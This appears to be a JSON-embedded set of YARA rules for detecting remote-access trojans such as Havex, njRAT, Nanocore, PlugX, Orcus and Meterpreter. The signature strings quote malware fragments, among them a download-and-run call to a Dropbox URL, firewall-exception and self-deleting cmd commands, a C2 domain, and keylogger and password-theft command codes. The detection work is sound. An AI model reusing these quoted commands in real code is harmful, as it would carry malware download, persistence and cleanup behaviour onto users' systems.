  "Win32OPCHavex": "rule Win32OPCHavex\n{\n    meta:\n        Author      = \"BAE Systems\"\n        Date        = \"2014/06/23\"\n        Description = \"Rule for identifying OPC version of HAVEX\"\n        Reference   = \"www.f-secure.com/weblog/archives/00002718.html\"\n\n    strings:\n        $mzhdr = \"MZ\"\n        $dll = \"7CFC52CD3F87.dll\"\n        $a1 = \"Start finging of LAN hosts...\" wide\n        $a2 = \"Finding was fault. Unexpective error\" wide\n        $a3 = \"Was found %i hosts in LAN:\" wide\n        $a4 = \"Hosts was't found.\" wide\n        $a5 = \"Start finging of OPC Servers...\" wide\n        $a6 = \"Was found %i OPC Servers.\" wide\n        $a7 = \"OPC Servers not found. Programm finished\" wide\n        $a8 = \"%s[%s]!!!EXEPTION %i!!!\" wide\n        $a9 = \"Start finging of OPC Tags...\" wide\n\n    condition:\n        $mzhdr at 0 and ($dll or (any of ($a*)))\n}",
  "Win32FertgerHavex": "rule Win32FertgerHavex\n{\n    meta:\n        Author      = \"BAE Systems\"\n        Date        = \"2014/06/23\"\n        Description = \"Rule for identifying Fertger version of HAVEX\"\n        Reference   = \"www.f-secure.com/weblog/archives/00002718.html\"\n\n    strings:\n        $mz = \"MZ\"\n        $a1=\"\\\\\\\\.\\\\pipe\\\\mypipe-f\" wide\n        $a2=\"\\\\\\\\.\\\\pipe\\\\mypipe-h\" wide\n        $a3=\"\\\\qln.dbx\" wide\n        $a4=\"*.yls\" wide\n        $a5=\"\\\\*.xmd\" wide\n        $a6=\"fertger\" wide\n        $a7=\"havex\"\n    \n    condition:\n        $mz at 0 and 3 of ($a*) \n}",
  "Havex_Trojan_PHP_Server": "rule Havex_Trojan_PHP_Server\n{\n    meta:\n        Author      = \"Florian Roth\"\n        Date        = \"2014/06/24\"\n        Description = \"Detects the PHP server component of the Havex RAT\"\n        Reference   = \"www.f-secure.com/weblog/archives/00002718.html\"\n\n    strings:\n        $s1 = \"havex--></body></head>\"\n        $s2 = \"ANSWERTAG_START\"\n        $s3 = \"PATH_BLOCKFILE\"\n\n    condition:\n        all of them\n}",
  "SANS_ICS_Cybersecurity_Challenge_400_Havex_Memdump": "rule SANS_ICS_Cybersecurity_Challenge_400_Havex_Memdump : memory\n\t{\n\tmeta:\n\t\tdescription = \"Detects Havex Windows process executable from memory dump\"\n\t\tdate = \"2015-12-2\"\n\t\tauthor = \"Chris Sistrunk\"\n\t\thash = \"8065674de8d79d1c0e7b3baf81246e7d\"\n\tstrings:\n\t\t$magic = { 4d 5a }\t\n\t\n\t        $s1 = \"~tracedscn.yls\" fullword wide\n\t\t$s2 = \"[!]Start\" fullword wide\n\t\t$s3 = \"[+]Get WSADATA\" fullword wide\n\t\t$s4 = \"[-]Can not get local ip\" fullword wide\n\t\t$s5 = \"[+]Local:\" fullword wide\n\t\t$s6 = \"[-]Threads number > Hosts number\" fullword wide\n\t\t$s7 = \"[-]Connection error\" fullword wide\n\t\t\n\t\t$x1 = \"bddd4e2b84fa2ad61eb065e7797270ff.exe\" fullword wide\n\tcondition:\n\t    $magic at 0 and ( 3 of ($s*) or $x1 )\n}",
  "apt_win32_dll_rat_hiZor_RAT": "rule apt_win32_dll_rat_hiZor_RAT: RAT\n{\n\tmeta:\n    description = \"Detects hiZor RAT\"\n\t\thash1 = \"75d3d1f23628122a64a2f1b7ef33f5cf\"\n\t\thash2 = \"d9821468315ccd3b9ea03161566ef18e\"\n\t\thash3 = \"b9af5f5fd434a65d7aa1b55f5441c90a\"\n    ref1 = \"http://www.threatgeek.com/2016/01/introducing-hi-zor-rat.html\"\n    ref2 = \"https://github.com/Neo23x0/Loki/blob/b187ed063d73d0defc6958100ca7ad04aa77fc12/signatures/apt_hizor_rat.yar\"\n    reference = \"https://www.fidelissecurity.com/sites/default/files/FTA_1020_Fidelis_Inocnation_FINAL.pdf\"\n\tstrings:\n\t\t// Part of the encoded User-Agent = Mozilla\n\t\t$s1 = { c7 [5] 40 00 62 00 c7 [5] 77 00 64 00 c7 [5] 61 00 61 00 c7 [5] 6c 00 }\n\n\t\t// XOR to decode User-Agent after string stacking 0x10001630\n\t\t$s2 = { 66 [7] 0d 40 83 ?? ?? 7c ?? }\n\n\t\t// XOR with 0x2E - 0x10002EF6\n\t\t$s3 = { 80 [2] 2e 40 3b ?? 72 ?? }\n\n\t\t$s4 = \"CmdProcessExited\" wide ascii\n\t\t$s5 = \"rootDir\" wide ascii\n\t\t$s6 = \"DllRegisterServer\" wide ascii\n\t\t$s7 = \"GetNativeSystemInfo\" wide ascii\n\t\t$s8 = \"%08x%08x%08x%08x\" wide ascii\n\tcondition:\n\t\t(uint16(0) == 0x5A4D or uint32(0) == 0x4464c457f) and (all of them)\n}",
  "Indetectables_RAT": "rule Indetectables_RAT: RAT {\n\tmeta:\n\t\tdescription = \"Detects Indetectables RAT based on strings found in research by Paul Rascagneres & Ronan Mouchoux\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.sekoia.fr/blog/when-a-brazilian-string-smells-bad/\"\n\t\tdate = \"2015-10-01\"\n\t\tsuper_rule = 1\n\t\thash1 = \"081905074c19d5e32fd41a24b4c512d8fd9d2c3a8b7382009e3ab920728c7105\"\n\t\thash2 = \"66306c2a55a3c17b350afaba76db7e91bfc835c0e90a42aa4cf59e4179b80229\"\n\t\thash3 = \"1fa810018f6dd169e46a62a4f77ae076f93a853bfc33c7cf96266772535f6801\"\n\tstrings:\n\t\t$s1 = \"Coded By M3\" fullword wide\n\t\t$s2 = \"Stub Undetector M3\" fullword wide\n\t\t$s3 = \"www.webmenegatti.com.br\" wide\n\t\t$s4 = \"M3n3gatt1\" fullword wide\n\t\t$s5 = \"TheMisterFUD\" fullword wide\n\t\t$s6 = \"KillZoneKillZoneKill\" fullword ascii\n\t\t$s7 = \"[[__M3_F_U_D_M3__]]$\" fullword ascii\n\t\t$s8 = \"M3_F_U_D_M3\" ascii\n\t\t$s9 = \"M3n3gatt1hack3r\" fullword wide\n\t\t$s9a = \"M3n3gatt1hack3r\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 5000KB and 1 of them\n}",
  "BergSilva_Malware": "rule BergSilva_Malware : RAT {\n\tmeta:\n\t\tdescription = \"Detects a malware from the same author as the Indetectables RAT\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"2015-10-01\"\n\t\tsuper_rule = 1\n\t\thash1 = \"00e175cbad629ee118d01c49c11f3d8b8840350d2dd6d16bd81e47ae926f641e\"\n\t\thash2 = \"6b4cbbee296e4a0e867302f783d25d276b888b1bf1dcab9170e205d276c22cfc\"\n\tstrings:\n\t\t$x1 = \"C:\\\\Users\\\\Berg Silva\\\\Desktop\\\\\" wide\n\t\t$x2 = \"URLDownloadToFileA 0, \\\"https://dl.dropbox.com/u/105015858/nome.exe\\\", \\\"c:\\\\nome.exe\\\", 0, 0\" fullword wide\n\n\t\t$s1 = \" Process.Start (Path.GetTempPath() & \\\"name\\\" & \\\".exe\\\") 'start server baixado\" fullword wide\n\t\t$s2 = \"FileDelete(@TempDir & \\\"\\\\nome.exe\\\") ;Deleta o Arquivo para que possa ser executado normalmente\" fullword wide\n\t\t$s3 = \" Lib \\\"\\\\WINDOWS\\\\system32\\\\UsEr32.dLl\\\"\" fullword wide\n\t\t$s4 = \"$Directory = @TempDir & \\\"\\\\nome.exe\\\" ;Define a variavel\" fullword wide\n\t\t$s5 = \"https://dl.dropbox.com/u/105015858\" wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and ( 1 of ($x*) or 2 of ($s*) )\n}",
  "apt_win32_dll_rat_1a53b0cp32e46g0qio7": "rule apt_win32_dll_rat_1a53b0cp32e46g0qio7\n{\n\tmeta:\n\t\tauthor = \"https://www.fidelissecurity.com/\"\n        \tinfo = \"Indicators for FTA-1020\"\n\t\thash1 = \"75d3d1f23628122a64a2f1b7ef33f5cf\"\n\t\thash2 = \"d9821468315ccd3b9ea03161566ef18e\"\n\t\thash3 = \"b9af5f5fd434a65d7aa1b55f5441c90a\"\n\t\treference = \"https://github.com/fideliscyber\"\n\tstrings:\n    \t// Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0;rv:11.0) like Gecko\n\t\t$ = { c7 [2] 64 00 63 00 c7 [2] 69 00 62 00 c7 [2] 7a 00 7e 00 c7 [2] 2d 00 43 00 c7 [2] 59 00 2d 00 c7 [2] 3b 00 23 00 c7 [2] 3e 00 36 00 c7 [2] 2d 00 5a 00 c7 [2] 42 00 5a 00 c7 [2] 3b 00 39 00 c7 [2] 36 00 2d 00 c7 [2] 59 00 7f 00 c7 [2] 64 00 69 00 c7 [2] 68 00 63 00 c7 [2] 79 00 22 00 c7 [2] 3a 00 23 00 c7 [2] 3d 00 36 00 c7 [2] 2d 00 7f 00 c7 [2] 7b 00 37 00 c7 [2] 3c 00 3c 00 c7 [2] 23 00 3d 00 c7 [2] 24 00 2d 00 c7 [2] 61 00 64 00 c7 [2] 66 00 68 00 c7 [2] 2d 00 4a 00 c7 [2] 68 00 6e 00 c7 [2] 66 00 62 00 } // offset 10001566\n\t// Software\\Microsoft\\Windows\\CurrentVersion\\Run\n       $ = { c7 [2] 23 00 24 00 c7 [2] 24 00 33 00 c7 [2] 38 00 22 00 c7 [2] 00 00 33 00 c7 [2] 24 00 25 00 c7 [2] 3f 00 39 00 c7 [2] 38 00 0a 00 c7 [2] 04 00 23 00 c7 [2] 38 00 00 00 c7 [2] 43 00 66 00 c7 [2] 6d 00 60 00 c7 [2] 67 00 52 00 c7 [2] 6e 00 63 00 c7 [2] 7b 00 67 00 c7 [2] 70 00 00 00 c7 [2] 43 00 4d 00 c7 [2] 44 00 00 00 c7 [2] 0f 00 43 00 c7 [2] 00 00 50 00 c7 [2] 49 00 4e 00 c7 [2] 47 00 00 00 c7 [2] 11 00 12 00 c7 [2] 17 00 0e 00 c7 [2] 10 00 0e 00 c7 [2] 10 00 0e 00 c7 [2] 11 00 06 00 c7 [2] 44 00 45 00 c7 [2] 4c 00 00 00 } // 10003D09\n\t$ = { 66 [4-7] 0d 40 83 f8 44 7c ?? }\n       // xor\t\tword ptr [ebp+eax*2+var_5C], 14h\n\t// inc\t\teax\n\t// cmp     \teax, 14h\n       // Loop to decode a static string. It reveals the \"1a53b0cp32e46g0qio9\" static string sent in the beacon\n\t$ = { 66 [4-7] 14 40 83 f8 14 7c ?? } // 100017F0\n\t$ = { 66 [4-7] 56 40 83 f8 2d 7c ?? } // 10003621\n\t$ = { 66 [4-7] 20 40 83 f8 1a 7c ?? } // 10003640\n\t$ = { 80 [2-7] 2e 40 3d 50 02 00 00 72 ?? } //  10003930\n\t$ = \"%08x%08x%08x%08x\" wide ascii\n\t$ = \"WinHttpGetIEProxyConfigForCurrentUser\" wide ascii\n\n\tcondition:\n\t(uint16(0) == 0x5A4D or uint32(0) == 0x4464c457f) and (all of them)\n}",
  "Meterpreter_Reverse_Tcp": "rule Meterpreter_Reverse_Tcp { \n  meta: // This is the standard backdoor/RAT from Metasploit, could be used by any actor \n    author = \"chort (@chort0)\" \n    description = \"Meterpreter reverse TCP backdoor in memory. Tested on Win7x64.\" \n  strings: \n    $a = { 4d 45 54 45 52 50 52 45 54 45 52 5f 54 52 41 4e 53 50 4f 52 54 5f 53 53 4c [32-48] 68 74 74 70 73 3a 2f 2f 58 58 58 58 58 58 } // METERPRETER_TRANSPORT_SSL \u2026 https://XXXXXX \n    $b = { 4d 45 54 45 52 50 52 45 54 45 52 5f 55 41 } // METERPRETER_UA \n    $c = { 47 45 54 20 2f 31 32 33 34 35 36 37 38 39 20 48 54 54 50 2f 31 2e 30 } // GET /123456789 HTTP/1.0 \n    $d = { 6d 65 74 73 72 76 2e 64 6c 6c [2-4] 52 65 66 6c 65 63 74 69 76 65 4c 6f 61 64 65 72 } // metsrv.dll \u2026 ReflectiveLoader \n    \n  condition: \n    $a or (any of ($b, $d) and $c) \n  }",
  "Nanocore_RAT_Gen_1": "rule Nanocore_RAT_Gen_1 {\n\tmeta:\n\t\tdescription = \"Detetcs the Nanocore RAT and similar malware\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/\"\n\t\tdate = \"2016-04-22\"\n\t\tscore = 70\n\t\thash1 = \"e707a7745e346c5df59b5aa4df084574ae7c204f4fb7f924c0586ae03b79bf06\"\n\tstrings:\n\t\t$x1 = \"C:\\\\Users\\\\Logintech\\\\Dropbox\\\\Projects\\\\New folder\\\\Latest\\\\Benchmark\\\\Benchmark\\\\obj\\\\Release\\\\Benchmark.pdb\" fullword ascii\n\t\t$x2 = \"RunPE1\" fullword ascii\n\t\t$x3 = \"082B8C7D3F9105DC66A7E3267C9750CF43E9D325\" fullword ascii\n\t\t$x4 = \"$374e0775-e893-4e72-806c-a8d880a49ae7\" fullword ascii\n\t\t$x5 = \"Monitorinjection\" fullword ascii\n\tcondition:\n\t\t( uint16(0) == 0x5a4d and filesize < 100KB and ( 1 of them ) ) or ( 3 of them )\n}",
  "Nanocore_RAT_Gen_2": "rule Nanocore_RAT_Gen_2 {\n\tmeta:\n\t\tdescription = \"Detetcs the Nanocore RAT\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 100\n\t\treference = \"https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/\"\n\t\tdate = \"2016-04-22\"\n\t\thash1 = \"755f49a4ffef5b1b62f4b5a5de279868c0c1766b528648febf76628f1fe39050\"\n\tstrings:\n\t\t$x1 = \"NanoCore.ClientPluginHost\" fullword ascii\n\t\t$x2 = \"IClientNetworkHost\" fullword ascii\n\t\t$x3 = \"#=qjgz7ljmpp0J7FvL9dmi8ctJILdgtcbw8JYUc6GC8MeJ9B11Crfg2Djxcf0p8PZGe\" fullword ascii\n\tcondition:\n\t\t( uint16(0) == 0x5a4d and filesize < 1000KB and 1 of them ) or ( all of them )\n}",
  "Nanocore_RAT_Sample_1": "rule Nanocore_RAT_Sample_1 {\n\tmeta:\n\t\tdescription = \"Detetcs a certain Nanocore RAT sample\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 75\n\t\treference = \"https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/\"\n\t\tdate = \"2016-04-22\"\n\t\thash2 = \"b7cfc7e9551b15319c068aae966f8a9ff563b522ed9b1b42d19c122778e018c8\"\n\tstrings:\n\t\t$x1 = \"TbSiaEdJTf9m1uTnpjS.n9n9M7dZ7FH9JsBARgK\" fullword wide\n\t\t$x2 = \"1EF0D55861681D4D208EC3070B720C21D885CB35\" fullword ascii\n\t\t$x3 = \"popthatkitty.Resources.resources\" fullword ascii\n\tcondition:\n\t\t( uint16(0) == 0x5a4d and filesize < 900KB and ( 1 of ($x*) ) ) or ( all of them )\n}",
  "Nanocore_RAT_Sample_2": "rule Nanocore_RAT_Sample_2 {\n\tmeta:\n\t\tdescription = \"Detetcs a certain Nanocore RAT sample\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 75\n\t\treference = \"https://www.sentinelone.com/blogs/teaching-an-old-rat-new-tricks/\"\n\t\tdate = \"2016-04-22\"\n\t\thash1 = \"51142d1fb6c080b3b754a92e8f5826295f5da316ec72b480967cbd68432cede1\"\n\tstrings:\n\t\t$s1 = \"U4tSOtmpM\" fullword ascii\n\t\t$s2 = \")U71UDAU_QU_YU_aU_iU_qU_yU_\" fullword wide\n\t\t$s3 = \"Cy4tOtTmpMtTHVFOrR\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 40KB and all of ($s*)\n}",
  "NetWiredRC_B": "rule NetWiredRC_B : RAT\n{\n\tmeta:\n\t\tdescription = \"NetWiredRC\"\n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdate = \"2014-12-23\"\n\t\tfiletype = \"memory\"\n\t\tversion = \"1.1\" \n\n\tstrings:\n\t\t$mutex = \"LmddnIkX\"\n\n\t\t$str1 = \"%s.Identifier\"\n\t\t$str2 = \"%d:%I64u:%s%s;\"\n\t\t$str3 = \"%s%.2d-%.2d-%.4d\"\n\t\t$str4 = \"[%s] - [%.2d/%.2d/%d %.2d:%.2d:%.2d]\"\n\t\t$str5 = \"%.2d/%.2d/%d %.2d:%.2d:%.2d\"\n\t\t\n\t\t$klg1 = \"[Backspace]\"\n\t\t$klg2 = \"[Enter]\"\n\t\t$klg3 = \"[Tab]\"\n\t\t$klg4 = \"[Arrow Left]\"\n\t\t$klg5 = \"[Arrow Up]\"\n\t\t$klg6 = \"[Arrow Right]\"\n\t\t$klg7 = \"[Arrow Down]\"\n\t\t$klg8 = \"[Home]\"\n\t\t$klg9 = \"[Page Up]\"\n\t\t$klg10 = \"[Page Down]\"\n\t\t$klg11 = \"[End]\"\n\t\t$klg12 = \"[Break]\"\n\t\t$klg13 = \"[Delete]\"\n\t\t$klg14 = \"[Insert]\"\n\t\t$klg15 = \"[Print Screen]\"\n\t\t$klg16 = \"[Scroll Lock]\"\n\t\t$klg17 = \"[Caps Lock]\"\n\t\t$klg18 = \"[Alt]\"\n\t\t$klg19 = \"[Esc]\"\n\t\t$klg20 = \"[Ctrl+%c]\"\n\n\tcondition: \n\t\t$mutex or (1 of ($str*) and 1 of ($klg*))\n}",
  "Njrat": "rule Njrat: RAT\n{\n    meta:\n        description = \"Njrat\"\n\tauthor = \"botherder https://github.com/botherder\"\n\n    strings:\n        $string1 = /(F)romBase64String/\n        $string2 = /(B)ase64String/\n        $string3 = /(C)onnected/ wide ascii\n        $string4 = /(R)eceive/\n        $string5 = /(S)end/ wide ascii\n        $string6 = /(D)ownloadData/ wide ascii\n        $string7 = /(D)eleteSubKey/ wide ascii\n        $string8 = /(g)et_MachineName/\n        $string9 = /(g)et_UserName/\n        $string10 = /(g)et_LastWriteTime/\n        $string11 = /(G)etVolumeInformation/\n        $string12 = /(O)SFullName/ wide ascii\n        $string13 = /(n)etsh firewall/ wide\n        $string14 = /(c)md\\.exe \\/k ping 0 & del/ wide\n        $string15 = /(c)md\\.exe \\/c ping 127\\.0\\.0\\.1 & del/ wide\n        $string16 = /(c)md\\.exe \\/c ping 0 -n 2 & del/ wide\n        $string17 = {7C 00 27 00 7C 00 27 00 7C}\n\n    condition:\n        10 of them\n}",
  "njrat1": "rule njrat1: RAT\n{\n    meta:\n        author = \"Brian Wallace @botnet_hunter\"\n        author_email = \"bwall@ballastsecurity.net\"\n        date = \"2015-05-27\"\n        description = \"Identify njRat\"\n    strings:\n        $a1 = \"netsh firewall add allowedprogram \" wide\n        $a2 = \"SEE_MASK_NOZONECHECKS\" wide\n\n        $b1 = \"[TAP]\" wide\n        $b2 = \" & exit\" wide\n\n        $c1 = \"md.exe /k ping 0 & del \" wide\n        $c2 = \"cmd.exe /c ping 127.0.0.1 & del\" wide\n        $c3 = \"cmd.exe /c ping\" wide\n    condition:\n        1 of ($a*) and 1 of ($b*) and 1 of ($c*)\n}",
  "win_exe_njRAT": "rule win_exe_njRAT \n{\nmeta:\nauthor = \"info@fidelissecurity.com\"\ndescripion = \"njRAT - Remote Access Trojan\"\ncomment = \"Variants have also been observed obfuscated with .NET Reactor\"\nfiletype = \"pe\"\ndate = \"2013-07-15\"\nversion = \"1.0\"\nhash1 = \"92ee1fb5df21d8cfafa2b02b6a25bd3b\"\nhash2 = \"3576d40ce18bb0349f9dfa42b8911c3a\"\nhash3 = \"24cc5b811a7f9591e7f2cb9a818be104\"\nhash4 = \"3ad5fded9d7fdf1c2f6102f4874b2d52\"\nhash5 = \"a98b4c99f64315aac9dd992593830f35\"\nhash6 =\"5fcb5282da1a2a0f053051c8da1686ef\"\nhash7 = \"a669c0da6309a930af16381b18ba2f9d\"\nhash8 = \"79dce17498e1997264346b162b09bde8\"\nhash9 = \"fc96a7e27b1d3dab715b2732d5c86f80\"\nref1 = \"http://bit.ly/19tlf4s\"\nref2 = \"http://www.fidelissecurity.com/threatadvisory\"\nref3 = \"http://www.threatgeek.com/2013/06/fidelis-threat-advisory-1009-njratuncovered.html\"\nref4 = \"http://threatgeek.typepad.com/files/fta-1009---njrat-uncovered.pdf\"\n\nstrings:\n$magic = \"MZ\"\n$string_setA_1 = \"FromBase64String\"\n$string_setA_2 = \"Base64String\"\n$string_setA_3 = \"Connected\" wide ascii\n$string_setA_4 = \"Receive\"\n$string_setA_5 = \"DeleteSubKey\" wide ascii\n$string_setA_6 = \"get_MachineName\"\n$string_setA_7 = \"get_UserName\"\n$string_setA_8 = \"get_LastWriteTime\"\n$string_setA_9 = \"GetVolumeInformation\"\n\n$string_setB_1 = \"OSFullName\" wide ascii\n$string_setB_2 = \"Send\" wide ascii\n$string_setB_3 = \"Connected\" wide ascii\n$string_setB_4 = \"DownloadData\" wide ascii\n$string_setB_5 = \"netsh firewall\" wide\n$string_setB_6 = \"cmd.exe /k ping 0 & del\" wide\n\ncondition:\n($magic at 0) and ( all of ($string_setA*) or all of ($string_setB*) ) \n}",
  "network_traffic_njRAT": "rule network_traffic_njRAT \n{\nmeta:\nauthor = \"info@fidelissecurity.com\"\ndescripion = \"njRAT - Remote Access Trojan\"\ncomment = \"Rule to alert on network traffic indicators\"\nfiletype = \"PCAP - Network Traffic\"\ndate = \"2013-07-15\"\nversion = \"1.0\"\nhash1 = \"92ee1fb5df21d8cfafa2b02b6a25bd3b\"\nhash2 =\"3576d40ce18bb0349f9dfa42b8911c3a\"\nhash3 =\"24cc5b811a7f9591e7f2cb9a818be104\"\nhash4 = \"3ad5fded9d7fdf1c2f6102f4874b2d52\"\nhash5 = \"a98b4c99f64315aac9dd992593830f35\"\nhash6 = \"5fcb5282da1a2a0f053051c8da1686ef\"\nhash7 = \"a669c0da6309a930af16381b18ba2f9d\"\nhash8 = \"79dce17498e1997264346b162b09bde8\"\nhash9 = \"fc96a7e27b1d3dab715b2732d5c86f80\"\nref1 = \"http://bit.ly/19tlf4s\"\nref2 = \"http://www.fidelissecurity.com/threatadvisory\"\nref3 = \"http://www.threatgeek.com/2013/06/fidelis-threat-advisory-1009-njrat-uncovered.html\"\nref4 = \"http://threatgeek.typepad.com/files/fta-1009---njrat-uncovered.pdf\"\n\nstrings:\n$string1 = \"FM|'|'|\"     // File Manager\n$string2 = \"nd|'|'|\"     // File Manager\n$string3 = \"rn|'|'|\"      // Run File\n$string4 = \"sc~|'|'|\"     // Remote Desktop\n$string5 = \"scPK|'|'|\"     // Remote Desktop\n$string6 = \"CAM|'|'|\"     // Remote Cam\n$string7 = \"USB Video Device[endof]\" // Remote Cam\n$string8 = \"rs|'|'|\"     // Reverse Shell\n$string9 = \"proc|'|'|\"     // Process Manager\n$string10 = \"k|'|'|\"     // Process Manager\n$string11 = \"RG|'|'|~|'|'|\"    // Registry Manipulation\n$string12 = \"kl|'|'|\"     // Keylogger file\n$string13 = \"ret|'|'|\"     // Get Browser Passwords\n$string14 = \"pl|'|'|\"     // Get Browser Passwords\n$string15 = \"lv|'|'|\"     // General\n$string16 = \"prof|'|'|~|'|'|\"   // Server rename\n$string17 = \"un|'|'|~[endof]\"   // Uninstall\n$idle_string = \"P[endof]\"    // Idle Connection\n\ncondition:\nany of ($string*) or #idle_string > 4  \n\n}",
  "RAT_Orcus": "rule RAT_Orcus \n{\n\n    meta:\n        author = \" J from THL <j@techhelplist.com> with thx to MalwareHunterTeam\"\n        date = \"2017/01\"\n        reference = \"https://virustotal.com/en/file/0ef747363828342c184303f2d6fbead054200e9c223e5cfc4777cda03006e317/analysis/\"\n        version = 1\n        maltype = \"RAT\"\n        filetype = \"memory\"\n\n    strings:\n        $text01 = \"Orcus.CommandManagement\"\n        $text02 = \"Orcus.Commands.\"\n        $text03 = \"Orcus.Config.\"\n        $text04 = \"Orcus.Connection.\"\n        $text05 = \"Orcus.Core.\"\n        $text06 = \"Orcus.exe\"\n        $text07 = \"Orcus.Extensions.\"\n        $text08 = \"Orcus.InstallationPromptForm\"\n        $text09 = \"Orcus.MainForm.\"\n        $text10 = \"Orcus.Native.\"\n        $text11 = \"Orcus.Plugins.\"\n        $text12 = \"orcus.plugins.dll\"\n        $text13 = \"Orcus.Properties.\"\n        $text14 = \"Orcus.Protection.\"\n        $text15 = \"Orcus.Share.\"\n        $text16 = \"Orcus.Shared\"\n        $text17 = \"Orcus.StaticCommands\"\n        $text18 = \"Orcus.Utilities.\"\n        $text19 = \"\\\\Projects\\\\Orcus\\\\Source\\\\Orcus.\"\n        $text20 = \".orcus.plugins.dll.zip\"\n        $text21 = \".orcus.shared.dll.zip\"\n        $text22 = \".orcus.shared.utilities.dll.zip\"\n        $text23 = \".orcus.staticcommands.dll.zip\"\n        $text24 = \"HvncCommunication\"\n        $text25 = \"HvncAction\"\n        $text26 = \"hvncDesktop\"\n        $text27 = \".InstallationPromptForm\"\n        $text28 = \"RequestKeyLogCommand\"\n        $text29 = \"get_KeyLogFile\"\n        $text30 = \"LiveKeyloggerCommand\"\n        $text31 = \"ORCUS.STATICCOMMANDS, VERSION=\"\n        $text32 = \"PrepareOrcusFileToRemove\"\n        $text33 = \"ConvertFromOrcusValueKind\"\n\n    condition:\n        13 of them\n}",
  "plugX": "rule plugX : rat\n{\n\tmeta:\n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdescription = \"PlugX RAT\"\n\t\tdate = \"2014-05-13\"\n\t\tfiletype = \"memory\"\n\t\tversion = \"1.0\" \n\t\tref1 = \"https://github.com/mattulm/IR-things/blob/master/volplugs/plugx.py\"\n\t\t\n\tstrings:\n\t\t$v1a = { 47 55 4C 50 00 00 00 00 }\n\t\t$v1b = \"/update?id=%8.8x\" \n\t\t$v1algoa = { BB 33 33 33 33 2B } \n\t\t$v1algob = { BB 44 44 44 44 2B } \n\t\t$v2a = \"Proxy-Auth:\" \n\t\t$v2b = { 68 A0 02 00 00 } \n\t\t$v2k = { C1 8F 3A 71 } \n\t\t\n\tcondition: \n\t\t$v1a at 0 or $v1b or (($v2a or $v2b) and (($v1algoa and $v1algob) or $v2k))\n}",
  "PlugX_mw": "rule PlugX_mw\n{ \n\tmeta:\n\t\tmaltype = \"plugX\"\n\t\tauthor = \"https://github.com/reed1713\"\n\t\treference = \"http://www.fireeye.com/blog/technical/targeted-attack/2014/02/operation-greedywonk-multiple-economic-and-foreign-policy-sites-compromised-serving-up-flash-zero-day-exploit.html\"\n\t\tdescription = \"Malware creates a randomized directory within the appdata roaming directory and launches the malware. Should see multiple events for create process rundll32.exe and iexplorer.exe as it repeatedly uses iexplorer to launch the rundll32 process.\"\n\tstrings:\n\t\t$type=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid=\"4688\"\n\t\t$data=/\\\\AppData\\\\Roaming\\\\[0-9]{9,12}\\VMwareCplLauncher\\.exe/\n\n\t\t$type1=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid1=\"4688\"\n\t\t$data1=\"\\\\Windows\\\\System32\\\\rundll32.exe\"\n\n\t\t$type2=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid2=\"4688\"\n\t\t$data2=\"Program Files\\\\Internet Explorer\\\\iexplore.exe\"\n\tcondition:\n\t\tall of them\n}",
  "PoetRat_Doc": "rule PoetRat_Doc\n{\n    meta:\n        Author = \"Nishan Maharjan\"\n        Description = \"A yara rule to catch PoetRat Word Document\"\n        Data = \"6th May 2020\"\n    strings:\n        $pythonRegEx = /(\\.py$|\\.pyc$|\\.pyd$|Python)/  // checking for python strings\n\n        // Python file strings in the word documents\n        $pythonFile1 = \"launcher.py\"\n        $zipFile = \"smile.zip\"\n        $pythonFile2 = \"smile_funs.py\"\n        $pythonFile3 = \"frown.py\"\n        $pythonFile4 = \"backer.py\"\n        $pythonFile5 = \"smile.py\"\n        $pythonFile6 = \"affine.py\" \n\n        // dlls and cmd strings\n        $dlls = /\\.dll/\n        $cmd = \"cmd\"\n        $exe = \".exe\"   \n    condition:\n    all of them        \n}",
  "PoetRat_Python": "rule PoetRat_Python\n{\n    meta:\n        Author = \"Nishan Maharjan\"\n        Description = \"A yara rule to catch PoetRat python scripts\"\n        Data = \"6th May 2020\"\n    strings:\n\n        // Any of the strings that stand out in the files, these are for the multiple python files, not just for a single file\n        $encrptionFunction = \"Affine\"\n        $commands = /version|ls|cd|sysinfo|download|upload|shot|cp|mv|link|register|hid|compress|jobs|exit|tasklist|taskkill/\n        $domain = \"dellgenius.hopto.org\"\n        $grammer_massacre = /BADD|Bad Error Happened|/\n        $mayBePresent = /self\\.DIE|THE_GUID_KEY/\n        $pipe_out = \"Abibliophobia23\"\n        $shot = \"shot_{0}_{1}.png\"\n    condition:\n        3 of them        \n}",
  "poisonivy_1": "rule poisonivy_1 : rat\n{\n\tmeta:\n\t\tdescription = \"Poison Ivy\"\n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdate = \"2013-02-01\"\n\t\tfiletype = \"memory\"\n\t\tversion = \"1.0\" \n\t\tref1 = \"https://code.google.com/p/volatility/source/browse/trunk/contrib/plugins/malware/poisonivy.py\"\n\n\tstrings:\n\t\t$a = { 53 74 75 62 50 61 74 68 ?? 53 4F 46 54 57 41 52 45 5C 43 6C 61 73 73 65 73 5C 68 74 74 70 5C 73 68 65 6C 6C 5C 6F 70 65 6E 5C 63 6F 6D 6D 61 6E 64 [22] 53 6F 66 74 77 61 72 65 5C 4D 69 63 72 6F 73 6F 66 74 5C 41 63 74 69 76 65 20 53 65 74 75 70 5C 49 6E 73 74 61 6C 6C 65 64 20 43 6F 6D 70 6F 6E 65 6E 74 73 5C } \n\t\t\n\tcondition:\n\t\t$a\n}",
